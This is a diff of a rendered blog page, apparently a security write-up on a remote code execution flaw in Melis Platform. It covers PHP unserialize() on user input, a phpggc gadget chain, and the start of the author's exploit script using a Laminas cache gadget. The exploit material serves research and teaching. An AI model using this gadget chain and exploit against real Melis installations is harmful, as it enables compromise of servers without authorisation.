@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.498676c34eb225e85357ab0ce19c3c1244f3bd0bf595e5684d1b9d50ea4fbc42.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1368,16 +1368,14 @@
 
     
   
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G6WT3WSKMH"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-G6WT3WSKMH', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-G6WT3WSKMH', { 'anonymize_ip': false });
 }
 </script>
 
@@ -1739,7 +1737,7 @@ if (!doNotTrack) {
 <p>At <strong><code>melis-front/src/Controller/MelisPluginRendererController.php</code></strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1754,20 +1752,20 @@ if (!doNotTrack) {
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">class MelisPluginRendererController extends MelisAbstractActionController
-{
-  public function getPluginAction()
-  { 
-      // [...]
-      $post = $this-&gt;getRequest()-&gt;getPost()-&gt;toArray();     // [1]
-      $pluginHardcodedConfig = array();
-      if (!empty($post[&#39;pluginHardcodedConfig&#39;]))
-      {
-          $pluginHardcodedConfig = $post[&#39;pluginHardcodedConfig&#39;]; // [2]
-          $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES);
-          $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES);
-          $pluginHardcodedConfig = unserialize($pluginHardcodedConfig); // [3]
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MelisPluginRendererController</span> <span class="k">extends</span> <span class="nx">MelisAbstractActionController</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="k">function</span> <span class="nf">getPluginAction</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">      <span class="c1">// [...]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$post</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getPost</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>     <span class="c1">// [1]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$pluginHardcodedConfig</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$post</span><span class="p">[</span><span class="s1">&#39;pluginHardcodedConfig&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$pluginHardcodedConfig</span> <span class="o">=</span> <span class="nv">$post</span><span class="p">[</span><span class="s1">&#39;pluginHardcodedConfig&#39;</span><span class="p">];</span> <span class="c1">// [2]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nv">$pluginHardcodedConfig</span> <span class="o">=</span> <span class="nx">html_entity_decode</span><span class="p">(</span><span class="nv">$pluginHardcodedConfig</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$pluginHardcodedConfig</span> <span class="o">=</span> <span class="nx">html_entity_decode</span><span class="p">(</span><span class="nv">$pluginHardcodedConfig</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$pluginHardcodedConfig</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$pluginHardcodedConfig</span><span class="p">);</span> <span class="c1">// [3]
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -1808,7 +1806,7 @@ if (!doNotTrack) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1824,21 +1822,21 @@ if (!doNotTrack) {
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">POST /news/id/2 HTTP/1.1
-Host: www.mysite.local
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Referer: http://www.mysite.local/melis
-Cookie: PHPSESSID=dhd40qdsqb3goj8lkmausre78d; show_bubble_plugins=true; dashboard_notify=false
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 0
-
-pluginHardcodedConfig=Ediscxxxxxx
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">news</span><span class="o">/</span><span class="nx">id</span><span class="o">/</span><span class="mi">2</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="nx">www</span><span class="o">.</span><span class="nx">mysite</span><span class="o">.</span><span class="nx">local</span>
+</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">X11</span><span class="p">;</span> <span class="nx">Ubuntu</span><span class="p">;</span> <span class="nx">Linux</span> <span class="nx">x86_64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">109.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">112.0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Referer</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">mysite</span><span class="o">.</span><span class="nx">local</span><span class="o">/</span><span class="nx">melis</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">PHPSESSID</span><span class="o">=</span><span class="nx">dhd40qdsqb3goj8lkmausre78d</span><span class="p">;</span> <span class="nx">show_bubble_plugins</span><span class="o">=</span><span class="k">true</span><span class="p">;</span> <span class="nx">dashboard_notify</span><span class="o">=</span><span class="k">false</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">pluginHardcodedConfig</span><span class="o">=</span><span class="nx">Ediscxxxxxx</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/Reproduce-bug-Remote-Code-Execution-in-Melis-Platform/Untitled.png" alt="Untitled" /></p>
 <p>And at this point, we can also control any value passed into the <code>unserialize()</code> function, which is enough to move on to the next phase.</p>
@@ -1859,7 +1857,7 @@ pluginHardcodedConfig=Ediscxxxxxx
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1868,14 +1866,14 @@ pluginHardcodedConfig=Ediscxxxxxx
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="p">.</span><span class="o">/</span><span class="n">phpggc</span> <span class="o">-</span><span class="n">i</span> <span class="n">Laminas</span><span class="o">/</span><span class="n">FD1</span>
-<span class="n">Name</span>           <span class="p">:</span> <span class="n">Laminas</span><span class="o">/</span><span class="n">FD1</span>
-<span class="k">Version</span>        <span class="p">:</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">2</span>
-<span class="k">Type</span>           <span class="p">:</span> <span class="n">File</span> <span class="k">delete</span>
-<span class="n">Vector</span>         <span class="p">:</span> <span class="n">__destruct</span>
-
-<span class="p">.</span><span class="o">/</span><span class="n">phpggc</span> <span class="n">Laminas</span><span class="o">/</span><span class="n">FD1</span> <span class="o">&lt;</span><span class="n">remote_path</span><span class="o">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">phpggc</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">Laminas</span><span class="o">/</span><span class="n">FD1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Name</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="n">Laminas</span><span class="o">/</span><span class="n">FD1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Version</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Type</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="n">File</span><span class="w"> </span><span class="k">delete</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Vector</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="n">__destruct</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">phpggc</span><span class="w"> </span><span class="n">Laminas</span><span class="o">/</span><span class="n">FD1</span><span class="w"> </span><span class="o">&lt;</span><span class="n">remote_path</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>But the impact causes is too too significant and destructive for organizations. As a pentester, we need to find other chains that have less impact.</p>
 <h3 id="finding-new-chain">Finding new chain</h3>
@@ -1886,16 +1884,16 @@ pluginHardcodedConfig=Ediscxxxxxx
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">	Saves any deferred items that have not been committed
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">	<span class="nx">Saves</span> <span class="nx">any</span> <span class="nx">deferred</span> <span class="nx">items</span> <span class="nx">that</span> <span class="nx">have</span> <span class="k">not</span> <span class="nx">been</span> <span class="nx">committed</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>At <strong><code>laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php</code></strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1913,23 +1911,23 @@ pluginHardcodedConfig=Ediscxxxxxx
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-
-<span class="k">namespace</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool</span><span class="p">;</span>
-
-<span class="c1"># [...]
-</span><span class="c1"></span><span class="k">class</span> <span class="nc">CacheItemPoolDecorator</span> <span class="k">implements</span> <span class="nx">CacheItemPoolInterface</span>
-<span class="p">{</span>
-   <span class="sd">/**
-</span><span class="sd">    * Destructor.
-</span><span class="sd">    *
-</span><span class="sd">    * Saves any deferred items that have not been committed
-</span><span class="sd">    */</span>
-   <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
-   <span class="p">{</span>
-       <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">commit</span><span class="p">();</span>
-   <span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># [...]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">CacheItemPoolDecorator</span> <span class="k">implements</span> <span class="nx">CacheItemPoolInterface</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">    * Destructor.
+</span></span></span><span class="line"><span class="cl"><span class="sd">    *
+</span></span></span><span class="line"><span class="cl"><span class="sd">    * Saves any deferred items that have not been committed
+</span></span></span><span class="line"><span class="cl"><span class="sd">    */</span>
+</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">   <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">commit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">   <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
@@ -1939,7 +1937,7 @@ pluginHardcodedConfig=Ediscxxxxxx
 <p>Go deeper into the <code>commit()</code> function at  <code>vendor/laminas/laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1954,20 +1952,20 @@ pluginHardcodedConfig=Ediscxxxxxx
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">public function commit()
-    {
-        $notSaved = [];
-  
-        foreach ($this-&gt;deferred as <span class="err">&amp;</span>$item) {
-            if (! $this-&gt;save($item)) {
-                $notSaved[] = $item;
-            }
-        }
-        $this-&gt;deferred = $notSaved;
-  
-        return empty($this-&gt;deferred);
-    }
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">commit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$notSaved</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deferred</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$notSaved</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deferred</span> <span class="o">=</span> <span class="nv">$notSaved</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deferred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>It is easy to notice that all values of <code>$this-&gt;deferred</code> are saved to cache by the <code>$this-&gt;save()</code> function (lines 5-9)</li>
@@ -1977,7 +1975,7 @@ pluginHardcodedConfig=Ediscxxxxxx
 <p>Go deeper into the <code>$this-&gt;save()</code> function</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2020,48 +2018,48 @@ pluginHardcodedConfig=Ediscxxxxxx
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">public function save(CacheItemInterface $item)
-    {
-        if (! $item instanceof CacheItem) {
-            throw new InvalidArgumentException(&#39;$item must be an instance of &#39; . CacheItem::class);
-        }
-  
-        $itemTtl = $item-&gt;getTtl();
-  
-        // delete expired item
-        if ($itemTtl <span class="p">&lt;</span> <span class="nt">0</span><span class="err">)</span> <span class="err">{</span>
-            <span class="err">$</span><span class="na">this-</span><span class="p">&gt;</span>deleteItem($item-&gt;getKey());
-            $item-&gt;setIsHit(false); // không có trong cache
-            return false;
-        }
-  
-        $saved   = true;
-        $options = $this-&gt;storage-&gt;getOptions();
-        $ttl     = $options-&gt;getTtl();
-  
-        try {
-            // get item value and serialize, if required
-            $value = $item-&gt;get();
-  
-            // reset TTL on adapter, if required
-            if ($itemTtl &gt; 0) {
-                $options-&gt;setTtl($itemTtl);
-            }
-  
-            $saved = $this-&gt;storage-&gt;setItem($item-&gt;getKey(), $value);
-            // saved items are a hit? see integration test CachePoolTest::testIsHit()
-            $item-&gt;setIsHit($saved);
-        } catch (Exception\InvalidArgumentException $e) {
-            throw new InvalidArgumentException($e-&gt;getMessage(), $e-&gt;getCode(), $e);
-        } catch (Exception\ExceptionInterface $e) {
-            $saved = false;
-        } finally {
-            $options-&gt;setTtl($ttl);
-        }
-  
-        return $saved;
-    }
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save</span><span class="p">(</span><span class="nx">CacheItemInterface</span> <span class="nv">$item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$item</span> <span class="nx">instanceof</span> <span class="nx">CacheItem</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">&#39;$item must be an instance of &#39;</span> <span class="o">.</span> <span class="nx">CacheItem</span><span class="o">::</span><span class="na">class</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$itemTtl</span> <span class="o">=</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">getTtl</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// delete expired item
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$itemTtl</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deleteItem</span><span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="na">getKey</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">setIsHit</span><span class="p">(</span><span class="k">false</span><span class="p">);</span> <span class="c1">// không có trong cache
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$saved</span>   <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$options</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">getOptions</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ttl</span>     <span class="o">=</span> <span class="nv">$options</span><span class="o">-&gt;</span><span class="na">getTtl</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// get item value and serialize, if required
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">// reset TTL on adapter, if required
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nv">$itemTtl</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$options</span><span class="o">-&gt;</span><span class="na">setTtl</span><span class="p">(</span><span class="nv">$itemTtl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nv">$saved</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">setItem</span><span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="na">getKey</span><span class="p">(),</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// saved items are a hit? see integration test CachePoolTest::testIsHit()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">setIsHit</span><span class="p">(</span><span class="nv">$saved</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception\InvalidArgumentException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">(),</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getCode</span><span class="p">(),</span> <span class="nv">$e</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception\ExceptionInterface</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$saved</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$options</span><span class="o">-&gt;</span><span class="na">setTtl</span><span class="p">(</span><span class="nv">$ttl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$saved</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
@@ -2084,7 +2082,7 @@ pluginHardcodedConfig=Ediscxxxxxx
 <p>This is the code I’ve written to exploit this vulnerability</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2152,73 +2150,73 @@ pluginHardcodedConfig=Ediscxxxxxx
 </span><span class="lnt">66
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-
-<span class="k">namespace</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool</span> <span class="p">{</span>
-    <span class="k">class</span> <span class="nc">CacheItemPoolDecorator</span><span class="p">{}</span>
-
-    <span class="k">class</span> <span class="nc">CacheItem</span><span class="p">{}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">Laminas\Cache\Storage\Adapter</span> <span class="p">{</span>
-    <span class="k">class</span> <span class="nc">Filesystem</span><span class="p">{}</span>
-    <span class="k">class</span> <span class="nc">FilesystemOptions</span><span class="p">{}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="p">{</span>
-   
-    <span class="k">function</span> <span class="nf">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
-        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
